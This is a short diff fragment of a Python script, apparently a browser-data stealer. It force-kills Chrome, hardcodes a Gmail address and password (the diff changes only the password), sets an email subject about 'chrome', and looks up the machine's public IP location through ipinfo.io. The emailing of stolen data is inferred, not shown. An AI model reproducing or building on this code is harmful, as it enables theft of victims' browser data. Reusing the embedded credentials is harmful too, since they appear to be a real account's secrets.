@@ -17,7 +17,7 @@ from urllib2 import urlopen
 
 os.system("taskkill /F /IM chrome.exe")
 gmail_user ='peterkowell@gmail.com'
-gmail_pwd ='135ishieke'
+gmail_pwd ='holymoses'
 subject='chrome tins'
 url = 'http://ipinfo.io/json'
 response = urlopen(url)
